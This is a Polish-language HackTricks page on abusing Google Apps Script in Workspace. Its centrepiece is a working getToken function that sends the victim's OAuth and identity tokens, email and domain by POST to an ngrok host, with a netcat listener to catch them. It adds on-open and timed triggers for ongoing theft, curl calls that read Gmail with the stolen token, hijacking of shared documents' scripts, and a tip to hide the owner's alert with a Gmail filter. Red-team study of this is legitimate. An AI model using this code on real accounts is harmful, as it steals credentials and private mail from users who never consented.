# GWS - Skrypty aplikacji

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Skrypty aplikacji

Skrypty aplikacji to **kod, który zostanie uruchomiony, gdy użytkownik o uprawnieniach edytora uzyska dostęp do dokumentu, z którym skrypt aplikacji jest powiązany**, po **zaakceptowaniu monitu OAuth**.\
Mogą również być ustawione do **wykonywania się co określony czas** przez właściciela skryptu aplikacji (trwałość).

### Tworzenie skryptu aplikacji

Istnieje kilka sposobów tworzenia skryptu aplikacji, chociaż najczęstsze z nich to **z dokumentu Google (dowolnego typu)** i jako **samodzielny projekt**:

<details>

<summary>Utwórz projekt powiązany z kontenerem z dokumentów Google, arkuszy lub prezentacji</summary>

1. Otwórz dokument Docs, arkusz Sheets lub prezentację Slides.
2. Kliknij **Rozszerzenia** > **Skrypty Google Apps**.
3. W edytorze skryptów kliknij **Nieopisany projekt**.
4. Nadaj swojemu projektowi nazwę i kliknij **Zmień nazwę**.

</details>

<details>

<summary>Utwórz samodzielny projekt</summary>

Aby utworzyć samodzielny projekt z Apps Script:

1. Przejdź do [`script.google.com`](https://script.google.com/).
2. Kliknij **Nowy projekt**.
3. W edytorze skryptów kliknij **Nieopisany projekt**.
4. Nadaj swojemu projektowi nazwę i kliknij **Zmień nazwę**.

</details>

<details>

<summary>Utwórz samodzielny projekt z Google Drive</summary>

1. Otwórz [Google Drive](https://drive.google.com/).
2. Kliknij **Nowy** > **Więcej** > **Skrypty Google Apps**.

</details>

<details>

<summary>Utwórz projekt powiązany z kontenerem z formularzy Google</summary>

1. Otwórz formularz w Google Forms.
2. Kliknij Więcej more\_vert > **Edytor skryptów**.
3. W edytorze skryptów kliknij **Nieopisany projekt**.
4. Nadaj swojemu projektowi nazwę i kliknij **Zmień nazwę**.

</details>

<details>

<summary>Utwórz samodzielny projekt za pomocą narzędzia wiersza poleceń clasp</summary>

`clasp` to narzędzie wiersza poleceń, które umożliwia tworzenie, pobieranie/pchanie i wdrażanie projektów Apps Script z terminala.

Zobacz [Przewodnik po interfejsie wiersza poleceń za pomocą narzędzia `clasp`](https://developers.google.com/apps-script/guides/clasp) dla więcej szczegółów.

</details>

## Scenariusz skryptu aplikacji <a href="#create-using-clasp" id="create-using-clasp"></a>

### Utwórz arkusz Google z skryptem aplikacji

Zacznij od utworzenia skryptu aplikacji, moja rekomendacja dla tego scenariusza to utworzenie arkusza Google i przejście do **`Rozszerzenia > Skrypty aplikacji`**, co spowoduje otwarcie **nowego skryptu aplikacji powiązanego z arkuszem**.

### Wyciek tokena

Aby umożliwić dostęp do tokenu OAuth, musisz kliknąć **`Usługi +` i dodać zakresy takie jak**:

* **AdminDirectory**: Dostęp do użytkowników i grup katalogu (jeśli użytkownik ma wystarczające uprawnienia)
* **Gmail**: Dostęp do danych Gmaila
* **Drive**: Dostęp do danych dysku
* **Google Sheets API**: Działa z wyzwalaczem

Aby samodzielnie zmienić **wymagane zakresy**, możesz przejść do ustawień projektu i **włączyć opcję `Pokaż plik manifestu "appsscript.json" w edytorze`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Aby przechwycić żądanie, wystarczy uruchomić:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
### Uprawnienia żądane do wykonania skryptu aplikacji:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Podczas zewnętrznego żądania, monit OAuth również **poprosi o zgodę na dostęp do zewnętrznych punktów końcowych**.
{% endhint %}

### Tworzenie wyzwalacza

Po odczytaniu aplikacji, kliknij **⏰ Wyzwalacze**, aby utworzyć wyzwalacz. Jako **funkcję** do uruchomienia wybierz **`getToken`**, uruchamiaj przy wdrożeniu **`Head`**, w źródle zdarzenia wybierz **`Z arkusza kalkulacyjnego`**, a typ zdarzenia wybierz **`Przy otwarciu`** lub **`Przy edycji`** (w zależności od potrzeb) i zapisz.

Zauważ, że możesz sprawdzić **uruchomienia skryptów aplikacji w zakładce Wykonania**, jeśli chcesz coś debugować.

### Udostępnianie

Aby **uruchomić** **skrypt aplikacji**, ofiara musi połączyć się z dostępem **Edytora**.

Podsumowując, jeśli twórca i zaproszony użytkownik są **z tej samej organizacji**, **token OAuth** będzie **należał** do **użytkownika**, który uzyskuje dostęp do pliku.\
Jeśli są z **różnych organizacji**, **token** będzie należał do **twórcy wyzwalacza**, zawsze z **tylko uprawnieniami OAuth**, które zostały udzielone podczas tworzenia wyzwalacza.

{% hint style="success" %}
**Token** używany do wykonania **skryptu aplikacji** będzie należał do **twórcy wyzwalacza**, nawet jeśli plik jest otwarty jako Edytor przez innych użytkowników.
{% endhint %}

### Nadużywanie dokumentów udostępnionych w folderze "Udostępnione ze mną"

{% hint style="danger" %}
Jeśli ktoś **udostępnił ci dokument z skryptami aplikacji i wyzwalaczem, używając "Head"** skryptu aplikacji (a nie stałego wdrożenia), możesz zmodyfikować kod skryptu aplikacji (dodając na przykład funkcje kradzieży tokenów), uzyskać do niego dostęp, a **skrypt aplikacji zostanie wykonany z uprawnieniami użytkownika, który udostępnił dokument**! (zauważ, że token OAuth właściciela będzie miał zakresy dostępu określone podczas tworzenia wyzwalacza).

**Powiadomienie zostanie wysłane do twórcy skryptu, informując, że ktoś zmodyfikował skrypt** (A co powiesz na wykorzystanie uprawnień Gmail do wygenerowania filtru, który zapobiegnie alertowi?)
{% endhint %}

{% hint style="success" %}
Jeśli **atakujący zmieni zakresy skryptu aplikacji**, aktualizacje **nie zostaną zastosowane** do dokumentu, dopóki nie zostanie utworzony **nowy wyzwalacz** z wprowadzonymi zmianami. Dlatego atakujący nie będzie w stanie ukraść tokena właściciela z większymi zakresami niż te, które ustawił w utworzonym przez siebie wyzwalaczu.
{% endhint %}

### Kopiowanie zamiast udostępniania

Podczas tworzenia linku do udostępnienia dokumentu, tworzony jest link podobny do tego: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Jeśli **zmienisz** końcówkę **"/edit"** na **"/copy"**, zamiast uzyskać do niego dostęp, Google zapyta, czy chcesz **wygenerować kopię dokumentu**:

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Jeśli użytkownik utworzy kopię i uzyska do niej dostęp, **zawartość dokumentu i skrypty aplikacji zostaną skopiowane**, ale **wyzwalacze nie zostaną**, dlatego **nic nie zostanie wykonane**.

### Udostępnianie jako aplikacja internetowa

Należy zauważyć, że można również **udostępnić skrypt aplikacji jako aplikację internetową** (w Edytorze skryptu aplikacji, wdrożyć jako aplikację internetową), ale pojawi się taki alert:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Następnie pojawi się **typowy monit OAuth**, pytający o wymagane uprawnienia.

### Testowanie

Możesz przetestować zebrany token, aby wyświetlić emaile za pomocą:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lista kalendarza użytkownika:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script jako trwałość

Jedną z opcji trwałości jest **utworzenie dokumentu i dodanie wyzwalacza dla funkcji getToken**, a następnie udostępnienie dokumentu atakującemu, aby za każdym razem, gdy atakujący otworzy plik, **wyciekł token ofiary**.

Możliwe jest również utworzenie App Script i ustawienie go jako wyzwalacz, który będzie uruchamiany co pewien czas (na przykład co minutę, godzinę, dzień...). Atakujący, który **uzyskał dostęp do poświadczeń lub sesji ofiary**, może ustawić wyzwalacz czasowy dla App Script i **wyciekać bardzo uprzywilejowany token OAuth codziennie**:

Po prostu utwórz App Script, przejdź do Wyzwalaczy, kliknij Dodaj wyzwalacz i wybierz jako źródło zdarzenia Wyzwalane czasowo, a następnie wybierz opcje, które najlepiej pasują do Twoich potrzeb:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Spowoduje to wysłanie alertu bezpieczeństwa na e-mail i powiadomienie push na telefon o tym zdarzeniu.
{% endhint %}



### Ominięcie niezweryfikowanego monitu udostępnionego dokumentu

Ponadto, jeśli ktoś **udostępnił** Ci dokument z **uprawnieniami edytora**, możesz generować **App Scripty wewnątrz dokumentu**, a **WŁAŚCICIEL (twórca) dokumentu będzie właścicielem App Scriptu**.

{% hint style="warning" %}
Oznacza to, że **twórca dokumentu będzie wyświetlany jako twórca każdego App Scriptu**, który zostanie utworzony przez osobę z uprawnieniami edytora.

Oznacza to również, że **App Script będzie uznawany za zaufany przez środowisko Workspace** twórcy dokumentu.
{% endhint %}

{% hint style="danger" %}
Oznacza to również, że jeśli **App Script już istnieje** i ludzie **udzielili dostępu**, każda osoba z uprawnieniami **Edytuj** w dokumencie może go **modyfikować i nadużywać tego dostępu**.\
Aby nadużyć tego, potrzebujesz również, aby ludzie wywołali App Script. I jednym sprytnym trikiem jest **opublikowanie skryptu jako aplikacji internetowej**. Kiedy **ludzie**, którzy już **udzielili dostępu** do App Scriptu, wejdą na stronę internetową, wywołają **App Script** (to działa również za pomocą znaczników `<img>`).
{% endhint %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów na GitHubie**.

</details>
